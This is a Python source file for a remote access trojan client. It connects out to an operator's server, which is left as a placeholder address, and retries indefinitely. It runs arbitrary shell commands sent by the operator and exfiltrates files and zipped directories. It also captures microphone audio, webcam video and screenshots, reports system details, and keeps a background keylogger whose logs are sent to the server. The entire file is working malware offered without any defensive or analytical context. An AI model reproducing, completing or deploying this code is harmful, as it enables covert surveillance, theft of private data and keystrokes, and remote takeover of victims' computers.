import os
import sys
import datetime
import socket
import shutil
import subprocess as sp
import time
import signal
import pynput
import pyautogui
from pynput.keyboard import Key, Listener  
import logging
import numpy as np
import cv2
import pyaudio
import wave
from tenacity import retry
import platform
import threading
import getpass
def close():
    global s
    s.close()
    sys.exit()
def keylog(): 
    def process_key_press(key):
            try:
                current_key = '{0} pressed'.format(key)
            
             
                with open("___.txt","a+") as f:
                    
                    f.write(str(key)+".pressed'..'")
            except AttributeError:
                    f.write('>uk<')
    def process_key_release(key):
            try:
                current_key = '{0} pressed'.format(key)       
                with open("___.txt","a+") as f:
                    f.write(str(key)+".released'..'")
            except AttributeError:
                f.write("<uk>")
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press , on_release=process_key_release)
    with keyboard_listener: 
        keyboard_listener.join()

    
def cd():
    global s
    file_raw=s.recv(3000)
    file_path=file_raw.decode()
    try:
       if file_path.endswith(":"):
               os.chdir(file_path)
               volchanged="Changed volumes successfully"
               s.send(volchanged.encode())
               print("cd 1")
              
       elif file_path.endswith(""):
               os.chdir(file_path)
               dirchanged="Changed directory successfully"
               s.send(file_path.encode())
               print(dirchanged)
               
       else:
               os.chdir(file_path)
               dirchanged="Changed directory successfully"
               s.send(file_path.encode())
               print(dirchanged)
               
    
    except:
       failed="could not cd into directory/volume"
       s.send(failed.encode())
       print(failed)
       print('cd 2')
       
def grab():
    global s
    try:      
         file_rcv=s.recv(2000)
         print("query received")
         file=file_rcv.decode()
         print(file)
         if os.path.isdir(file):
                 Dir='Directory'
                 print(Dir)
                 s.send(Dir.encode())
                 zipfile=shutil.make_archive(file,'zip',file)
                 file_size=os.path.getsize(file+'.zip')
                 size=str(file_size)
                 s.send(size.encode())
                 response=s.recv(1024)
                 if response.decode()[:1]=="y":
                     print("file size %f"%file_size)
                     file_get=open(file+'.zip','rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
                     print("filesent")
                     os.remove(file+".zip")
                 else:
                     s.recv(1024)
                     print("releasing file...")
                   
         elif os.path.isfile(file):
                 Type='file'
                 s.send(Type.encode())
                 file_size=os.path.getsize(file)
                 size=str(file_size)
                 s.send(size.encode())
                 print("file size %f"%file_size)
                 response=s.recv(1024)
                 if response.decode()[:1]=="y":
                     file_get=open(file,'rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
                     print("filesent")
                 else:
                     s.recv(1024) 
                     print("releasing file...")
               
         
         else : 
                 error="File not found here"
                 print(error)
                 s.send(error.encode())
                 
    except:
         error="File not found"
         print(error)
         s.send(error.encode())
       
def audcap():
    global s
    timerec=s.recv(1024)
    capture_time=int(timerec.decode())
    try:
            chunk = 1024
            sample_format = pyaudio.paInt16
            channels = 2
            fs = 44100  
            seconds = capture_time
            filename = "audrec.wav"

            p = pyaudio.PyAudio()  

            print('Recording')

            stream = p.open(format=sample_format,input_device_index=0,
                            channels=channels,
                            rate=fs,
                            frames_per_buffer=chunk,
                            input=True)

            frames = []  

      
            for i in range(0, int(fs / chunk * seconds)):
                data = stream.read(chunk,exception_on_overflow=False)
                frames.append(data)

             
            stream.stop_stream()
            stream.close()
            
            p.terminate()

            print('Finished recording')

   
            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(frames))
            wf.close()
            file_size=os.path.getsize('audrec.wav')
            size=str(file_size)
            s.send(size.encode())
            response=s.recv(1024)
            if response.decode()[:1]=="y":            
                print("file size %f"%file_size)
                file_get=open('audrec.wav','rb')
                file_data=file_get.read(file_size)
                s.send(file_data)
                file_get.close()
                print("filesent")
                os.remove('audrec.wav')
            else:
                os.remove("audrec.wav")
            

    except:
            audfail="could not capture audio"
            s.send(audfail.encode())
def vidcap():
    global s
    timerec=s.recv(1024)
    capture_time=int(timerec.decode())  
    try:
                                      
            cap = cv2.VideoCapture(0)
    

      
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('vidrec.avi',fourcc,20.0,(640,480))
            begin_time=time.time()
            while(int(time.time() - begin_time) < capture_time ):
                ret, frame = cap.read()
                if ret==True:
                   

                   
                    out.write(frame)
            
                  
                else:
                    break

           
            cap.release()
            out.release()
            cv2.destroyAllWindows()
            file_size=os.path.getsize('vidrec.avi')
            size=str(file_size)
            s.send(size.encode())
            print("file size %f"%file_size)
            response=s.recv(1024)
            if response.decode()[:1]=="y":
                file_get=open('vidrec.avi','rb')
                file_data=file_get.read(file_size)
                s.send(file_data)
                file_get.close()
                print("filesent")
                os.remove('vidrec.avi')
            else:
                os.remove('vidrec.avi')
           
    except:
            capfail="could not capture video"
            print(capfail)
            s.send(capfail.encode())
            
def sysinfo():
    global s
    try:
        p=platform.machine(),platform.uname(),platform.system(),platform.processor(),getpass.getuser()
        s.send(str(p).encode())

    except:
        sf='could not acquire system information'
        s.send(sf.encode()) 
def screenshot():
    global s
    try:
         scrimage=pyautogui.screenshot()
         scrisave=pyautogui.screenshot('scrimage.jpg')
         
         file_size=os.path.getsize('scrimage.jpg')
         size=str(file_size)
         s.send(size.encode())
         print("file size %f"%file_size)
         file_get=open('scrimage.jpg','rb')
         file_data=file_get.read(file_size)
         s.send(file_data)
         file_get.close()
         print("filesent")
         os.remove('scrimage.jpg')
        
        
    except:
         error="Image not found"
         print(error)
         s.send(error.encode())
         
def upload():
    global s
    filenoun=s.recv(2000)
    filename=filenoun.decode()
    try:
            if filename.startswith('failed'):
                    print("could not receive file")
            else:    
                    check=s.recv(4000)
                    checked=check.decode()
                    size=int(checked)
                    print(filename,size)
                    file=open(filename,'wb')
                    file_data=s.recv(1024)
                    full_data=len(file_data)
                    file.write(file_data)
                    if full_data==size:
                        file.close()
                    while full_data<size:
                           file_data=s.recv(1024)
                           full_data += len(file_data)
                           file.write(file_data)
                    received="file received"
                    print(received)
                    s.send(received.encode())
    except:
            failed="could not receive file"
            s.send(failed.encode('utf-8'))
            print(failed)
@retry
def main():
    global s
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host="0.0.0.0"
    port=0000
    s.connect((host,port))
    print("connecting...")
    print("connected to server")
    print("Online")
    while 1:
        while True:
            insydys_control=s.recv(4000)
            insydys_control=insydys_control.decode("utf-8")
            print("...",insydys_control+"...")
            if insydys_control[:5]=="close":
                close()
                break
            elif insydys_control=="#":
                s.send(str.encode('#'))
                break
            elif insydys_control[:2]=="cd":
                cd()
                break
            elif insydys_control[:4]=="grab":
                grab()
                break
            elif insydys_control[:6]=="audcap":
                audcap()
                break
            elif insydys_control[:6]=="vidcap":
                vidcap()
                break
            elif insydys_control[:7]=="sysinfo":
                sysinfo()
                break
            elif insydys_control[:10]=="screenshot":
                screenshot()
                break
            elif insydys_control[:6]=="upload":
                upload()
                break
            elif insydys_control[:6]=="keylog":

                try:
                     file_size=os.path.getsize('___.txt')
                     size=str(file_size)
                     s.send(size.encode())
                     print("file size %f"%file_size)
                     file_get=open('___.txt','rb')
                     file_data=file_get.read(file_size)
                     s.send(file_data)
                     file_get.close()
                     print("filesent")
                     os.remove('___.txt')
                except:
                     c="could not capture key strokes"
                     s.send(c.encode())
                        
                
            
            else:
                sh=sp.Popen(insydys_control,shell=True,
                                        stdout=sp.PIPE,
                                        stderr=sp.PIPE,
                                        stdin=sp.PIPE)

                try:
                        direc=os.getcwd()
                        directo=direc.encode()
                        printout=sh.stdout.read() + sh.stderr.read()+directo
                        printo=printout.decode("utf-8")
                        get_out=open('_.txt','wb')
                        get_out.write(printout)
                        get_out.close()
                        sh.kill()
                        filed=os.path.getsize('_.txt')
                        file_d=str(filed)
                        print(filed)
                        s.send(file_d.encode())
                        print("sent")
                        file=open('_.txt','rb')
                        output_data=file.read(filed)
                        s.send(output_data)
                        file.close()
                        print(printo)
                        os.remove('_.txt')
                        break
                except:
                        error="unknown output"
                        s.send(error.encode())
                        sh.kill()
                        break


m=threading.Thread(name='keylog',target=keylog)
m.setDaemon(True)
if __name__=="__main__":
    m.start()
    main()
    


    

    

    
    

                
            
            
                
            
            
            
            
            
    

    
